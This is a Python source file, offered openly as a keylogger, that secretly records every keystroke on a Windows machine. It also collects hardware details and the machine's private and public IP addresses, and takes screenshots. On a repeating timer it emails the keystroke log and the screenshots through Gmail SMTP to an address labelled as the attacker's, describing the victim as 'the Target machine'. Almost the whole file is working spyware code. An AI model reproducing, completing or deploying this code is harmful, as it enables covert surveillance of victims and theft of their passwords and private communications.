# !python keylogger
# Copright of Kani Valat Kandemir, 2023

# encoding:utf-8
import keyboard
# To register keyboard keys
import datetime
# Allows mail to be sent at regular intervals
import smtplib
# Performs mail sending
import time
# Time library
import socket as sk
# Connect to the server for finding public ip and private ip
import requests as req
import os
# Operating System for windows
import pyautogui
# Taking screenshots
import wmi
# Collect information of device

from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.utils import formatdate

word = ""
transmission_range = 20
hostName = ""
host_name = ""
operatingName = ""
operatingVersion = ""
cpu = ""
ram = ""
gpu = ""
private_ip = ""
public_ip = ""
pIP_private = ""
pIP_public = ""

dosya = open("logs.txt", "w")
def osName():
    computer = wmi.WMI()
    computer_info = computer.Win32_ComputerSystem()[0]
    os_info = computer.Win32_OperatingSystem()[0]
    os_name = os_info.Name.encode('utf-8').split(b'|')[0]
    return os_name

def osVersion():
    computer = wmi.WMI()
    computer_info = computer.Win32_ComputerSystem()[0]
    os_info = computer.Win32_OperatingSystem()[0]
    os_version = ' '.join([os_info.Version, os_info.BuildNumber])
    return os_version

def CPU():
    computer = wmi.WMI()
    computer_info = computer.Win32_ComputerSystem()[0]
    proc_info = computer.Win32_Processor()[0]
    return proc_info.Name

def RAM():
    computer = wmi.WMI()
    computer_info = computer.Win32_ComputerSystem()[0]
    os_info = computer.Win32_OperatingSystem()[0]
    system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB
    return system_ram

def GPU():
    computer = wmi.WMI()
    computer_info = computer.Win32_ComputerSystem()[0]
    gpu_info = computer.Win32_VideoController()[0]
    return gpu_info.Name

def privateIP():
    hostName = sk.gethostname()
    private_ip = sk.gethostbyname(hostName)
    return private_ip

def publicIP():
    url: str = 'https://checkip.amazonaws.com'
    request = req.get(url)
    public_ip: str = request.text
    return public_ip

def on_press(key):
    global word
    global operatingName
    global operatingVersion
    global cpu
    global ram
    global gpu
    global pIP_private
    global pIP_public

    if key.name in ["space"]:
        with open("logs.txt", "a", encoding="utf-8") as file:
            file.write(
                # "OS Name: " +
                # operatingName + "\n" +
                "OS Version: " +
                operatingVersion + "\n" +
                "CPU: " +
                cpu + "\n" +
                "RAM: " +
                ram + "\n" +
                "Graphics Card: " +
                gpu + "\n" +
                "Private IP: " +
                pIP_private + "\n" +
                "Public IP: " +
                pIP_public + "\n" +
                "Keys: " +
                word + " " + "\n" +
                " Post date: " +
                str(datetime.datetime.now()) + "\n")
        word = ""

    elif key.name in ["enter"]:
        with open("logs.txt", "a", encoding="utf-8") as file:
            file.write(
                # "OS Name: " +
                # operatingName + "\n" +
                "OS Version: " +
                operatingVersion + "\n" +
                "CPU: " +
                cpu + "\n" +
                "RAM: " +
                ram + "\n" +
                "Graphics Card: " +
                gpu + "\n" +
                "Private IP: " +
                pIP_private + "\n" +
                "Public IP: " +
                pIP_public + "\n" +
                "Keys: " +
                word + " " + "\n" +
                " Post date: " +
                str(datetime.datetime.now()) + "\n")
            word = ""

    elif key.name == "backspace":
        word = word[:-1]  # to delete the last two character when there is an error

    else:
        word = word + key.name

operatingName = osName()
# operatingVersion = osVersion()
cpu = CPU()
ram = RAM()
gpu = GPU()
pIP_private = privateIP()
pIP_public = publicIP()
keyboard.on_press(on_press)

while True:
    with open("logs.txt") as file:
        data = file.read()

    if data:
        # Email data elements
        host = "smtp.gmail.com"
        port = 587
        from_email = "" # from email address
        target_email = "" # target email address
        email_password = "" # from email app password(Not gmail password, google third pard app password!!)

        msg = MIMEText(data)
        msg["Subject"] = "Keylogger Data"
        msg["From"] = from_email
        msg["To"] = target_email

        mail = smtplib.SMTP(host, port)  # gmail server -port 587
        mail.ehlo()  # ready for send
        mail.starttls()  # paths in encrypted form
        mail.login(from_email, email_password)
        mail.sendmail(from_email, target_email, msg.as_string())
        mail.close()

        with open("logs.txt", "w", encoding="utf-8") as file:
            file.write("")

        now = datetime.datetime.now()
        attachments_path = ""
        my_email = "" # from email address
        my_password = "" # from email app password

        # Take a screenshot and save it
        screenshot = pyautogui.screenshot()
        screenshot.save(attachments_path + "screenshot.png")

        # Sleep to allow screenshot processing
        time.sleep(5)

        # Construct the email
        msg = MIMEMultipart()
        msg['From'] = my_email
        msg['Date'] = formatdate(localtime=True)
        msg['Subject'] = "Screenshots from the Target machine"
        msg.attach(MIMEText("See attachment for update."))

        # And attach the screenshot we just took
        f = open(attachments_path + "screenshot.png", 'rb').read()
        attachment = MIMEImage(f, name=os.path.basename(attachments_path + "screenshot.png"))
        msg.attach(attachment)

        # Now send the email
        smtp = smtplib.SMTP('smtp.gmail.com')
        smtp.starttls()
        smtp.login(my_email, my_password)
        smtp.sendmail(my_email, my_email, msg.as_string())
        smtp.close()

        # Log it
        print(now.strftime("%Y-%m-%d %H:%M:%S") + " sent email")


    time.sleep(transmission_range)  # Mail sending interval

